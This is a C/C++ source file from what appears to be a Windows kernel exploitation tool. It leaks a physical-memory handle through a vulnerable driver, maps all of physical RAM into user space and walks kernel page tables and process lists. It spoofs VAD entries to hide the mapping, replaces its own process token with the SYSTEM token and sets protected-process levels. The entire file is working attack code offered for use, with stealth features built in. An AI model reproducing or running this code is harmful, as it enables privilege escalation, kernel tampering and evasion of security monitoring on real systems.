#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "window.h"

#pragma comment(lib, "psapi.lib")

#define MAX_CHUNKS 256
#define CHUNK_SIZE 0x40000000ULL

// Which fields of a VadPatch were really read/patched, so RestorePhysWindow()
// never writes a stale zero back into a field the spoof never touched.
#define VP_FLAGS      0x01
#define VP_STARTVPN   0x02
#define VP_ENDVPN     0x04
#define VP_STARTHIGH  0x08
#define VP_ENDHIGH    0x10

struct VadPatch {
    ULONG64 flagsVA, startVpnVA, endVpnVA, startHighVA, endHighVA;
    ULONG origFlags, origStartVpn, origEndVpn;
    BYTE origStartHigh, origEndHigh;
    BYTE valid;
};

static BOOL WINAPI ConsoleCtrlHandler(DWORD ctrl);
#define MAX_VAD_PATCHES 256
static VadPatch g_VadPatches[MAX_VAD_PATCHES] = {};
static ULONG g_VadPatchCount = 0;

static ULONG64 g_SpoofCr3 = 0;
static ULONG64 g_VirtualSizeVA = 0;
static ULONG64 g_VirtualSizeOrig = 0;

struct PhysChunk {
    ULONG64 physBase;
    BYTE* mappedAddr;
    ULONG64 mapSize;
    // true once every page of the view is present, i.e. the window can be read
    // and written without ever taking another page fault. Only those chunks may
    // have their VAD truncated - see PrefaultWindow().
    bool resident;
};

static PhysChunk g_Chunks[MAX_CHUNKS] = {};
static ULONG g_ChunkCount = 0;
static ULONG64 g_TotalMapped = 0;

static inline BYTE* ResolvePhysAddr(ULONG64 physAddr) {
    if (physAddr < 0x1000) return NULL;
    ULONG chunkIdx = (ULONG)(physAddr / CHUNK_SIZE);
    if (chunkIdx >= g_ChunkCount || !g_Chunks[chunkIdx].mappedAddr)
        return NULL;
    ULONG64 offset = physAddr - g_Chunks[chunkIdx].physBase;
    return g_Chunks[chunkIdx].mappedAddr + offset;
}

// Read a byte of the window, trapping a fault. Kept in its own function so the
// __try block is not mixed with C++ objects that need unwinding (C2712).
static bool TouchWindowPage(BYTE* page) {
    __try {
        volatile BYTE* p = page;
        (void)*p;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

// Write a byte back unchanged, trapping a fault. Used to verify - not to
// pre-fault - that the mapping is writable: see PrefaultWindow().
static bool ProbeWindowWrite(BYTE* page) {
    __try {
        BYTE v = *page;
        *page = v;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

BOOL WindowContains(ULONG64 physAddr) {
    return ResolvePhysAddr(physAddr) != NULL;
}

// Read a kernel pointer, saying out loud why it failed.
//
// This exists because WindowRead64() answers 0 for both "the value is 0" and
// "this address is not readable", and a linked-list walk treats a 0 Flink as
// the end of the list. That is how the EPROCESS and PiDDB walks both stopped
// short without saying anything.
//
// A window page that was never faulted in can also fail its first access, so a
// 0 is retried once after forcing the page in.
ULONG64 WindowReadKernelPtr(ULONG64 cr3, ULONG64 va, const char* what) {
    ULONG64 pa = WindowVirtToPhys(cr3, va);
    if (!pa) {
        printf("[-] %s: VA 0x%llX did not translate\n", what, va);
        return 0;
    }

    ULONG64 value = WindowRead64(pa);
    if (value) return value;

    BYTE* p = ResolvePhysAddr(pa);
    if (!p) {
        printf("[-] %s: VA 0x%llX -> PA 0x%llX is outside the %llu MB window\n",
               what, va, pa, g_TotalMapped / (1024 * 1024));
        return 0;
    }

    // Either the value really is 0, or the page was not faulted in yet.
    if (!TouchWindowPage(p)) {
        printf("[-] %s: PA 0x%llX could not be faulted in (commit limit?)\n", what, pa);
        return 0;
    }
    return WindowRead64(pa);
}

// Pre-fault the whole window before any VAD is spoofed.
//
// This is the hard requirement for the VAD spoof to be survivable. Truncating a
// VAD does not stop the kernel from keeping the section mapped, but it *does*
// remove the address range from the VAD tree, and a user-mode page fault is
// resolved through that tree: MiFindVad() finds nothing past the new end and
// the access comes back as STATUS_ACCESS_VIOLATION. The first physical read
// more than 64 KiB into a 1 GiB chunk after the spoof therefore kills the
// process - silently, because nothing in the tool has a handler there.
//
// Faulting every page in first makes the view need no further faults, so the
// truncated VADs only cost visibility (VirtualQuery) and nothing else.
//
// The touch is a read, never a write: these are live physical pages (kernel
// images, pools, DMA targets) and writing a byte back could clobber a
// concurrent update. Reads leave the contents untouched. A section-mapped
// physical page gets a present, section-writable PTE on a read fault, so the
// later WindowWrite* calls still work; ProbeWindowWrite() samples that.
static void PrefaultWindow() {
    ULONGLONG want = 0;
    for (ULONG i = 0; i < g_ChunkCount; i++)
        if (g_Chunks[i].mappedAddr) want += g_Chunks[i].mapSize;

    // Commit charge is charged per page of the window, so the tool can only
    // hide as much of it as the commit limit can absorb. GetPerformanceInfo
    // reports CommitTotal/CommitLimit in *pages*, not bytes.
    ULONGLONG available = 0;
    bool haveBudget = false;
    PERFORMANCE_INFORMATION perf = { sizeof(perf) };
    if (GetPerformanceInfo(&perf, sizeof(perf)) && perf.CommitLimit > perf.CommitTotal) {
        ULONGLONG pageSize = perf.PageSize ? perf.PageSize : 4096;
        available = (ULONGLONG)(perf.CommitLimit - perf.CommitTotal) * pageSize;
        haveBudget = true;
    }

    // The DSE phase afterwards downloads a PDB and runs DIA over it, so keep a
    // real margin instead of running the process right up against the limit.
    const ULONGLONG slack = 1024ULL << 20;
    ULONGLONG budget = (available > slack) ? available - slack : 0;

    ULONGLONG t0 = GetTickCount64();
    printf("[*] Pre-faulting window (%llu MB total, %llu MB commit available)...\n",
           want >> 20, available >> 20);

    const ULONGLONG kProbeStride = 0x4000000ULL; // 64 MiB
    ULONG resident = 0;
    ULONGLONG spent = 0;

    for (ULONG i = 0; i < g_ChunkCount; i++) {
        PhysChunk* c = &g_Chunks[i];
        if (!c->mappedAddr) continue;
        c->resident = false;

        // Chunks are handled in physical order, so whatever gets faulted in
        // forms a prefix of the window. Chunks are the same size, so once one
        // does not fit none of the later ones will either.
        if (haveBudget && spent + c->mapSize > budget) {
            printf("[-] Commit limit reached, leaving chunk %u and above unspoofed\n", i);
            break;
        }

        bool ok = true;
        for (ULONGLONG off = 0; off < c->mapSize; off += 0x1000) {
            if (!TouchWindowPage(c->mappedAddr + off)) {
                printf("[-] Chunk %u could not be faulted in at +0x%llX, leaving it unspoofed\n",
                       i, off);
                ok = false;
                break;
            }
        }
        if (!ok) continue;

        // Confirm the mapping is writable while a page fault can still be taken.
        for (ULONGLONG off = 0; off < c->mapSize; off += kProbeStride) {
            if (!ProbeWindowWrite(c->mappedAddr + off)) {
                printf("[-] Chunk %u is not writable, leaving it unspoofed\n", i);
                ok = false;
                break;
            }
        }
        if (ok) {
            c->resident = true;
            resident++;
            spent += c->mapSize;
        }
    }

    printf("[+] Window pre-faulted: %u/%u chunks resident, %llu MB committed (%llu ms)\n",
           resident, g_ChunkCount, spent >> 20, GetTickCount64() - t0);

    if (resident == 0)
        printf("[-] Nothing could be pre-faulted, the VADs stay intact (raise the pagefile for full stealth)\n");
}

// SystemMemoryListInformation output layout. Not in the SDK headers (only a
// similarly named crash-dump struct is), so declare it here.
struct PhysMemRange { ULARGE_INTEGER Base; ULARGE_INTEGER Length; };
struct PhysMemDescriptor { ULONG NumberOfRanges; struct PhysMemRange Range[1]; };

// Highest physical address the guest actually owns.
//
// GetPhysicallyInstalledSystemMemory() reports *installed* RAM, which is not the
// same as the top of the physical address space once memory has been added after
// boot (VM hot-add / dynamic memory). The page tables happily map frames above
// the installed total - a walk that lands on one of those returns a physical
// address the window does not cover, and a linked-list read of it comes back as
// 0, which silently truncates the walk. Ask the kernel for the real ranges and
// take whichever answer is larger.
static ULONG64 PhysicalMemoryLimit(ULONG64 installedBytes) {
    typedef NTSTATUS(WINAPI* pNtQSI)(ULONG, PVOID, ULONG, PULONG);
    auto NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                        "NtQuerySystemInformation");
    if (!NtQSI) return installedBytes;

    const ULONG SystemMemoryListInformation = 0x50;

    ULONG size = 0;
    // The probe call is *expected* to fail - it exists only to return the
    // required length in 'size'. Requiring STATUS_SUCCESS here would mean the
    // real query never runs.
    NtQSI(SystemMemoryListInformation, NULL, 0, &size);
    if (size < 16) {
        printf("[-] Could not size the memory list (size %u), using installed memory\n", size);
        return installedBytes;
    }

    BYTE* buf = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return installedBytes;

    ULONG64 top = 0;
    ULONG rangeCount = 0;
    if (NtQSI(SystemMemoryListInformation, buf, size, &size) == 0) {
        struct PhysMemDescriptor* pmd = (struct PhysMemDescriptor*)buf;
        struct PhysMemRange* ranges = (struct PhysMemRange*)(buf + 8);
        if (pmd->NumberOfRanges > 0 && pmd->NumberOfRanges < 4096) {
            rangeCount = pmd->NumberOfRanges;
            for (ULONG i = 0; i < pmd->NumberOfRanges; i++) {
                ULARGE_INTEGER end = ranges[i].Base;
                end.QuadPart += ranges[i].Length.QuadPart;
                if (end.QuadPart > top) top = (ULONG64)end.QuadPart;
            }
        }
    } else {
        printf("[-] Memory list query failed, using installed memory\n");
    }
    VirtualFree(buf, 0, MEM_RELEASE);

    printf("[*] Memory list: %u range(s), top 0x%llX (%llu MB)\n",
           rangeCount, top, top / (1024 * 1024));

    if (top > installedBytes) {
        printf("[+] physical memory reaches %llu MB, installed total is %llu MB\n",
               top / (1024 * 1024), installedBytes / (1024 * 1024));
        printf("[+] sizing the window to the real top, not the installed total\n");
        return top;
    }
    if (rangeCount == 0) {
        // No usable answer. A walk on this machine is known to hand back frames
        // well above the installed total, and a window that is too small is
        // silent and much harder to diagnose than a few refused maps, so probe
        // a generous range and let the failed chunks report themselves.
        printf("[+] memory list unusable, probing up to 64 GB and reporting holes\n");
        return 64ULL << 30;
    }
    return installedBytes;
}

bool SetupPhysWindow(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets) {
    printf("[*] Setting up physical memory window...\n");

    ULONGLONG installedKB = 0;
    GetPhysicallyInstalledSystemMemory(&installedKB);
    ULONG64 installedBytes = installedKB * 1024;
    ULONG64 totalPhysBytes = PhysicalMemoryLimit(installedBytes);

    ULONG chunksNeeded = (ULONG)((totalPhysBytes + CHUNK_SIZE - 1) / CHUNK_SIZE);
    if (chunksNeeded > MAX_CHUNKS) chunksNeeded = MAX_CHUNKS;

    // trigger handle leak via initial IOCTL
    void* firstMap = PhysMap(device, sc, 0x1000, 0x1000);
    if (!firstMap) return false;

    // Read physical 0x1000 straight from the mapping the driver just gave us.
    // Do NOT call PhysRead64/PhysUnmap here: the driver keeps the mapping
    // handle in a single slot, so an interleaved map/unmap desyncs it and the
    // later IOCTL_UNMAP_PHYS closes a freed handle (INVALID_KERNEL_HANDLE).
    ULONG64 knownValue = *(volatile ULONG64*)firstMap;

    // find the leaked PhysicalMemory handle
    HANDLE physHandle = NULL;
    for (ULONG64 h = 4; h < 0x10000; h += 4) {
        void* test = MapViewOfFile((HANDLE)h, FILE_MAP_READ, 0, 0x1000, 0x1000);
        if (test) {
            ULONG64 testValue = *(volatile ULONG64*)test;
            UnmapViewOfFile(test);
            if (testValue == knownValue) {
                physHandle = (HANDLE)h;
                break;
            }
        }
    }

    if (!physHandle) return false;

    // map entire physical address space in 1GB chunks
    for (ULONG i = 0; i < chunksNeeded; i++) {
        ULONG64 physBase = (ULONG64)i * CHUNK_SIZE;
        ULONG64 mapStart = physBase;
        ULONG mapSize = (ULONG)CHUNK_SIZE;
        if (i == 0) { mapStart = 0x1000; mapSize -= 0x1000; }

        DWORD offHigh = (DWORD)(mapStart >> 32);
        DWORD offLow = (DWORD)(mapStart & 0xFFFFFFFF);

        void* mapped = MapViewOfFile(physHandle, FILE_MAP_READ | FILE_MAP_WRITE,
                                     offHigh, offLow, mapSize);
        if (!mapped) {
            g_Chunks[i].physBase = physBase;
            g_Chunks[i].mappedAddr = NULL;
            g_Chunks[i].mapSize = 0;
            g_Chunks[i].resident = false;
            continue;
        }

        g_Chunks[i].physBase = mapStart;
        g_Chunks[i].mappedAddr = (BYTE*)mapped;
        g_Chunks[i].mapSize = mapSize;
        g_Chunks[i].resident = false;
        g_ChunkCount = i + 1;
        g_TotalMapped += mapSize;
    }

    // Do NOT close physHandle: the vulnerable driver owns/closes this leaked
    // handle in its IOCTL_UNMAP_PHYS path. Closing it here makes the driver's
    // later ZwClose hit a freed handle (INVALID_KERNEL_HANDLE under verifier).
    // The mapped views keep working regardless.

    atexit([]() { RestorePhysWindow(); });
    SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);

    printf("[+] Window: %llu MB in %u chunks\n", g_TotalMapped / (1024 * 1024), g_ChunkCount);

    for (ULONG i = 0; i < chunksNeeded; i++) {
        if (!g_Chunks[i].mappedAddr)
            printf("[-] chunk %u (phys 0x%llX) could not be mapped - addresses there are unreadable\n",
                   i, (ULONG64)i * CHUNK_SIZE);
    }

    // verify
    bool any = false;
    for (ULONG i = 0; i < g_ChunkCount; i++) {
        if (g_Chunks[i].mappedAddr && ResolvePhysAddr(g_Chunks[i].physBase + 0x1000)) {
            any = true;
            break;
        }
    }
    if (!any) return false;

    SetPhysWindowMode(true);
    printf("[+] Window verified\n");

    // Must happen before SpoofWindowVADs(), which depends on it.
    PrefaultWindow();

    return true;
}

ULONG64 WindowRead64(ULONG64 physAddr) {
    BYTE* p = ResolvePhysAddr(physAddr);
    return p ? *(volatile ULONG64*)p : 0;
}

ULONG WindowRead32(ULONG64 physAddr) {
    BYTE* p = ResolvePhysAddr(physAddr);
    return p ? *(volatile ULONG*)p : 0;
}

BYTE WindowRead8(ULONG64 physAddr) {
    BYTE* p = ResolvePhysAddr(physAddr);
    return p ? *p : 0;
}

void WindowReadBuffer(ULONG64 physAddr, void* buffer, ULONG size) {
    BYTE* p = ResolvePhysAddr(physAddr);
    if (p) memcpy(buffer, p, size);
}

void WindowWrite64(ULONG64 physAddr, ULONG64 value) {
    BYTE* p = ResolvePhysAddr(physAddr);
    if (p) *(volatile ULONG64*)p = value;
}

void WindowWriteBuffer(ULONG64 physAddr, void* buffer, ULONG size) {
    BYTE* p = ResolvePhysAddr(physAddr);
    if (p) memcpy(p, buffer, size);
}

static BOOL WINAPI ConsoleCtrlHandler(DWORD ctrl) {
    if (ctrl == CTRL_CLOSE_EVENT || ctrl == CTRL_C_EVENT)
        RestorePhysWindow();
    return FALSE;
}

void RestorePhysWindow() {
    if (!g_VadPatchCount && !g_VirtualSizeVA) return;

    printf("[*] Restoring %u VAD patch(es)...\n", g_VadPatchCount);

    // Re-resolve physical addresses at restore time: the VAD page may have
    // been paged out and remapped since the spoof, so cached PAs can be stale.
    for (ULONG i = 0; i < g_VadPatchCount; i++) {
        VadPatch* p = &g_VadPatches[i];
        if (!p->valid) continue;
        ULONG64 pa;
        if (p->valid & VP_FLAGS) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->flagsVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origFlags, sizeof(p->origFlags));
        }
        if (p->valid & VP_STARTVPN) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->startVpnVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origStartVpn, sizeof(p->origStartVpn));
        }
        if (p->valid & VP_ENDVPN) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->endVpnVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origEndVpn, sizeof(p->origEndVpn));
        }
        if (p->valid & VP_STARTHIGH) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->startHighVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origStartHigh, 1);
        }
        if (p->valid & VP_ENDHIGH) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->endHighVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origEndHigh, 1);
        }
    }
    g_VadPatchCount = 0;

    if (g_VirtualSizeVA) {
        ULONG64 pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, g_VirtualSizeVA) : 0;
        if (pa) WindowWrite64(pa, g_VirtualSizeOrig);
        g_VirtualSizeVA = 0;
    }

    printf("[+] VAD patches restored\n");
}

ULONG WindowVadPatchCount() {
    return g_VadPatchCount;
}

ULONG WindowResidentChunks() {
    ULONG n = 0;
    for (ULONG i = 0; i < g_ChunkCount; i++)
        if (g_Chunks[i].mappedAddr && g_Chunks[i].resident) n++;
    return n;
}

ULONG64 WindowVirtToPhys(ULONG64 cr3, ULONG64 virtualAddr) {
    const ULONG64 ADDR_MASK = 0x000FFFFFFFFFF000ULL;

    ULONG64 pml4e = WindowRead64((cr3 & ADDR_MASK) + ((virtualAddr >> 39) & 0x1FF) * 8);
    if (!(pml4e & 1)) return 0;

    ULONG64 pdpte = WindowRead64((pml4e & ADDR_MASK) + ((virtualAddr >> 30) & 0x1FF) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80)
        return (pdpte & 0x000FFFFFC0000000ULL) + (virtualAddr & 0x3FFFFFFF);

    ULONG64 pde = WindowRead64((pdpte & ADDR_MASK) + ((virtualAddr >> 21) & 0x1FF) * 8);
    if (!(pde & 1)) return 0;
    if (pde & 0x80)
        return (pde & 0x000FFFFFFFE00000ULL) + (virtualAddr & 0x1FFFFF);

    ULONG64 pte = WindowRead64((pde & ADDR_MASK) + ((virtualAddr >> 12) & 0x1FF) * 8);
    if (!(pte & 1)) return 0;

    return (pte & ADDR_MASK) + (virtualAddr & 0xFFF);
}

// VAD spoofing internals

static ULONG64 SpoofReadPtr(HANDLE dev, SyscallTable* sc, ULONG64 cr3, ULONG64 va) {
    ULONG64 pa = VirtToPhys(dev, sc, cr3, va);
    return pa ? PhysRead64(dev, sc, pa) : 0;
}

static void WalkAndSpoofVAD(
    HANDLE dev, SyscallTable* sc,
    ULONG64 nodeVA, ULONG64 cr3, KernelOffsets* offsets,
    int depth, int* spoofed, ULONG64* visited
) {
    if (!nodeVA || depth > 40 || *spoofed >= (int)g_ChunkCount) return;
    if (++*visited > 100000) return; // a cyclic/hostile VAD tree must not hang us

    ULONG64 nodePA = VirtToPhys(dev, sc, cr3, nodeVA);
    if (!nodePA) return;

    ULONG64 left = PhysRead64(dev, sc, nodePA);
    ULONG64 right = PhysRead64(dev, sc, nodePA + 0x08);

    ULONG64 startVpnPA = VirtToPhys(dev, sc, cr3, nodeVA + offsets->VadStartingVpn);
    ULONG64 endVpnPA = VirtToPhys(dev, sc, cr3, nodeVA + offsets->VadEndingVpn);
    if (!startVpnPA || !endVpnPA) goto recurse;

    {
        ULONG startVpn = PhysRead32(dev, sc, startVpnPA);
        ULONG endVpn = PhysRead32(dev, sc, endVpnPA);
        ULONG64 regionStart = (ULONG64)startVpn << 12;
        ULONG64 regionSize = ((ULONG64)endVpn - startVpn + 1) << 12;

        // How much of this VAD can be hidden. A window chunk that is not
        // resident still needs its VAD range, because the next read from it
        // has to take a page fault - and past the cut there is no VAD left to
        // resolve that fault, so the read comes back as STATUS_ACCESS_VIOLATION
        // and kills the process. So the cut stops in front of the first chunk
        // that was not pre-faulted, and everything below it may go.
        //
        // Taking the minimum over every chunk in the region (instead of trusting
        // the VAs to be in order) keeps the cut safe either way: at worst it
        // hides less than it could.
        ULONG64 cutVA = regionStart + regionSize;
        bool covers = false;
        for (ULONG i = 0; i < g_ChunkCount; i++) {
            if (!g_Chunks[i].mappedAddr) continue;
            ULONG64 chunkVA = (ULONG64)g_Chunks[i].mappedAddr;
            if (chunkVA < regionStart || chunkVA >= regionStart + regionSize) continue;
            covers = true;
            ULONG64 safe = g_Chunks[i].resident
                ? chunkVA + g_Chunks[i].mapSize
                : chunkVA;
            if (safe < cutVA) cutVA = safe;
        }

        if (covers && regionSize > 0x100000 && cutVA - regionStart > 0x100000
            && g_VadPatchCount < MAX_VAD_PATCHES) {

            VadPatch* p = &g_VadPatches[g_VadPatchCount];
            p->flagsVA = nodeVA + offsets->VadFlags;
            p->startVpnVA = nodeVA + offsets->VadStartingVpn;
            p->endVpnVA = nodeVA + offsets->VadEndingVpn;
            p->startHighVA = nodeVA + offsets->VadStartingVpnHigh;
            p->endHighVA = nodeVA + offsets->VadEndingVpnHigh;
            p->valid = 0;

            ULONG64 flagsPA = VirtToPhys(dev, sc, cr3, p->flagsVA);
            ULONG64 startHighPA = VirtToPhys(dev, sc, cr3, p->startHighVA);
            ULONG64 endHighPA = VirtToPhys(dev, sc, cr3, p->endHighVA);

            // skip secured VADs - this node must be skipped, not just this chunk
            if (flagsPA) {
                ULONG secFlags = PhysRead32(dev, sc, flagsPA);
                if (secFlags & 4u) goto recurse;
            }

            p->origStartVpn = startVpn;
            p->valid |= VP_STARTVPN;
            p->origEndVpn = endVpn;
            p->valid |= VP_ENDVPN;
            if (startHighPA) {
                PhysReadBuffer(dev, sc, startHighPA, &p->origStartHigh, 1);
                p->valid |= VP_STARTHIGH;
            }
            if (endHighPA) {
                PhysReadBuffer(dev, sc, endHighPA, &p->origEndHigh, 1);
                p->valid |= VP_ENDHIGH;
            }

            if (flagsPA) {
                p->origFlags = PhysRead32(dev, sc, flagsPA);
                p->valid |= VP_FLAGS;
                ULONG flags = p->origFlags;
                flags |= (1u << 20);
                flags &= ~(1u << 25);
                PhysWriteBuffer(dev, sc, flagsPA, &flags, sizeof(flags));
            }

            // endVpn is inclusive, so the last page kept is cutVA - 1
            ULONG fakeEnd = (ULONG)((cutVA - 1) >> 12);
            PhysWriteBuffer(dev, sc, endVpnPA, &fakeEnd, sizeof(fakeEnd));
            if (endHighPA) {
                BYTE z = 0;
                PhysWriteBuffer(dev, sc, endHighPA, &z, 1);
            }

            g_VadPatchCount++;
            (*spoofed)++;
        }
    }

recurse:
    WalkAndSpoofVAD(dev, sc, left, cr3, offsets, depth + 1, spoofed, visited);
    WalkAndSpoofVAD(dev, sc, right, cr3, offsets, depth + 1, spoofed, visited);
}

// Walk PsActiveProcessHead and return the EPROCESS that belongs to targetPid.
// The list is a circular doubly-linked list of LIST_ENTRYs embedded in each
// EPROCESS, so following Flink must come back to the head after visiting every
// process. Dying after a handful of entries means the head RVA is wrong, not
// that the system has three processes.
static bool FindEprocessByPid(ULONG64 cr3, KernelOffsets* offsets, ULONG64 listHeadVA,
                              DWORD targetPid, bool verbose, int* walked,
                              ULONG64* outEprocVA) {
    ULONG64 currentLink = WindowReadKernelPtr(cr3, listHeadVA, "PsActiveProcessHead");

    int count = 0;
    *outEprocVA = 0;
    while (currentLink != listHeadVA && currentLink != 0 && count < 500) {
        count++;
        ULONG64 eprocessVA = currentLink - offsets->ActiveProcessLinks;
        ULONG64 eprocessPA = WindowVirtToPhys(cr3, eprocessVA);
        if (!eprocessPA) {
            printf("[-] EPROCESS 0x%llX (link 0x%llX) did not translate, entry %d\n",
                   eprocessVA, currentLink, count);
            break;
        }

        ULONG64 pid = WindowRead64(eprocessPA + offsets->UniqueProcessId);
        if ((DWORD)pid == targetPid) {
            *outEprocVA = eprocessVA;
            *walked = count;
            return true;
        }
        if (verbose && count <= 8)
            printf("[*]   entry %d: link 0x%llX eprocess 0x%llX pid %llu\n",
                   count, currentLink, eprocessVA, pid);

        currentLink = WindowReadKernelPtr(cr3, currentLink, "EPROCESS Flink");
    }

    if (verbose)
        printf("[-] EPROCESS list ended after %d entries: Flink 0x%llX (head 0x%llX)\n",
               count, currentLink, listHeadVA);
    *walked = count;
    return false;
}

// Recover the EPROCESS list head without the PDB.
//
// PsInitialSystemProcess points at a known EPROCESS (the System process, always
// PID 4), and that EPROCESS embeds one of the list's LIST_ENTRYs. Following
// Blink from it walks the list backwards until reaching the head, which is the
// one node whose Blink points back at the node we arrived from. The result is
// only handed to the caller if a walk from it actually finds our own PID, so a
// wrong offset cannot turn into a wrong walk.
static bool RecoverEprocessListHead(ULONG64 systemCr3, KernelOffsets* offsets,
                                    DWORD ourPid, ULONG64* outHeadVA) {
    if (!offsets->PsInitialSystemProcess) return false;

    ULONG64 ptrPA = WindowVirtToPhys(systemCr3,
        offsets->NtoskrnlBase + offsets->PsInitialSystemProcess);
    if (!ptrPA) {
        printf("[-] PsInitialSystemProcess (RVA 0x%llX) did not translate\n",
               offsets->PsInitialSystemProcess);
        return false;
    }

    ULONG64 sysEproc = WindowRead64(ptrPA);
    if (!sysEproc) {
        printf("[-] PsInitialSystemProcess (RVA 0x%llX, PA 0x%llX) reads as 0\n",
               offsets->PsInitialSystemProcess, ptrPA);
        return false;
    }

    // Validate the EPROCESS layout while we have it: the System process is PID 4.
    ULONG64 pidPA = WindowVirtToPhys(systemCr3, sysEproc + offsets->UniqueProcessId);
    if (!pidPA || (DWORD)WindowRead64(pidPA) != 4) {
        printf("[-] PsInitialSystemProcess 0x%llX is not an EPROCESS (PID != 4)\n", sysEproc);
        return false;
    }

    ULONG64 node = sysEproc + offsets->ActiveProcessLinks;
    for (int i = 0; i < 4096; i++) {
        ULONG64 prev = WindowReadKernelPtr(systemCr3, node + 0x08, "EPROCESS Blink");
        if (!prev) {
            printf("[-] Blink walk gave up at node 0x%llX after %d steps\n", node, i);
            return false;
        }

        ULONG64 prevBlink = WindowReadKernelPtr(systemCr3, prev + 0x08, "candidate head Blink");
        if (!prevBlink) return false;
        if (prevBlink == node) { // prev is the list head
            *outHeadVA = prev;
            printf("[+] EPROCESS list head recovered at RVA 0x%llX (after %d Blink steps)\n",
                   prev - offsets->NtoskrnlBase, i);
            return true;
        }
        node = prev;
    }
    printf("[-] Blink walk did not reach a list head in 4096 steps\n");
    return false;
}

bool WindowFindOurEprocess(ULONG64 systemCr3, KernelOffsets* offsets, ULONG64* outEprocVA) {
    return WindowFindEprocessByPid(systemCr3, offsets, GetCurrentProcessId(), true, outEprocVA);
}

bool WindowFindEprocessByPid(ULONG64 systemCr3, KernelOffsets* offsets, DWORD pid,
                             bool verbose, ULONG64* outEprocVA) {
    ULONG64 psActiveVA = offsets->NtoskrnlBase + offsets->PsActiveProcessHead;

    int count = 0;
    *outEprocVA = 0;
    if (FindEprocessByPid(systemCr3, offsets, psActiveVA, pid, verbose, &count, outEprocVA))
        return true;

    if (verbose)
        printf("[-] PID %u not found via PsActiveProcessHead (RVA 0x%llX, %d entries walked)\n",
               pid, offsets->PsActiveProcessHead, count);

    // The head can be recovered from the System process, which is worth trying
    // for any PID, not just our own.
    ULONG64 recovered = 0;
    int probe = 0;
    if (RecoverEprocessListHead(systemCr3, offsets, pid, &recovered) &&
        FindEprocessByPid(systemCr3, offsets, recovered, pid, verbose, &probe, outEprocVA))
        return true;

    if (verbose)
        printf("[-] Could not locate the EPROCESS for PID %u\n", pid);
    *outEprocVA = 0;
    return false;
}

// The System process's primary token object (a kernel pointer).
ULONG64 WindowSystemToken(ULONG64 systemCr3, KernelOffsets* offsets) {
    if (!offsets->Token || !offsets->PsInitialSystemProcess) return 0;

    ULONG64 sysPtrPA = WindowVirtToPhys(systemCr3,
        offsets->NtoskrnlBase + offsets->PsInitialSystemProcess);
    if (!sysPtrPA) return 0;

    ULONG64 sysEproc = WindowRead64(sysPtrPA);
    if (!sysEproc) return 0;

    ULONG64 sysTokPA = WindowVirtToPhys(systemCr3, sysEproc + offsets->Token);
    if (!sysTokPA) return 0;
    return WindowRead64(sysTokPA);
}

// Point an EPROCESS's primary token at the System token.
bool WindowSetProcessToken(ULONG64 systemCr3, KernelOffsets* offsets,
                           ULONG64 eprocVA, ULONG64 systemToken, const char* what) {
    if (!offsets->Token || !systemToken || !eprocVA) return false;

    ULONG64 tokPA = WindowVirtToPhys(systemCr3, eprocVA + offsets->Token);
    if (!tokPA) {
        printf("[-] %s: token field did not translate\n", what);
        return false;
    }

    ULONG64 before = WindowRead64(tokPA);
    if (before == systemToken) {
        printf("[*] %s is already the System token\n", what);
        return true;
    }

    WindowWrite64(tokPA, systemToken);
    ULONG64 after = WindowRead64(tokPA);
    if (after == systemToken) {
        printf("[+] %s token -> SYSTEM (0x%llX -> 0x%llX)\n", what, before, systemToken);
        return true;
    }
    printf("[-] %s: token swap rejected (0x%llX)\n", what, after);
    return false;
}

bool SetProcessSystemToken(ULONG64 systemCr3, KernelOffsets* offsets) {
    if (!offsets->Token) {
        printf("[-] _EPROCESS::Token unavailable, cannot change the process token\n");
        return false;
    }

    ULONG64 systemToken = WindowSystemToken(systemCr3, offsets);
    if (!systemToken) {
        printf("[-] Could not read the System process token\n");
        return false;
    }

    ULONG64 ourEproc = 0;
    if (!WindowFindOurEprocess(systemCr3, offsets, &ourEproc)) return false;

    return WindowSetProcessToken(systemCr3, offsets, ourEproc, systemToken, "Our process");
}

// Protection is one byte; read it back so "it did not stick" is never reported
// as success. The field is write protected on some builds, and silently losing
// the write is worse than knowing.
BYTE WindowGetProcessProtection(ULONG64 systemCr3, KernelOffsets* offsets, ULONG64 eprocVA) {
    if (!eprocVA) return 0;
    ULONG64 protPA = WindowVirtToPhys(systemCr3, eprocVA + offsets->Protection);
    return protPA ? WindowRead8(protPA) : 0;
}

bool WindowSetProcessPpl(ULONG64 systemCr3, KernelOffsets* offsets,
                         ULONG64 eprocVA, BYTE level) {
    if (!eprocVA) return false;

    ULONG64 protPA = WindowVirtToPhys(systemCr3, eprocVA + offsets->Protection);
    if (!protPA) {
        printf("[-] Protection (off 0x%X) did not translate\n", offsets->Protection);
        return false;
    }

    BYTE before = WindowRead8(protPA);
    if (before == level) {
        printf("[+] PPL already 0x%02X\n", level);
        return true;
    }

    WindowWriteBuffer(protPA, &level, 1);
    BYTE after = WindowRead8(protPA);
    if (after == level) {
        printf("[+] PPL set (0x%02X, was 0x%02X)\n", level, before);
        return true;
    }
    printf("[-] PPL write did not stick (0x%02X, wanted 0x%02X) "
           "- the field is write protected\n", after, level);
    return false;
}

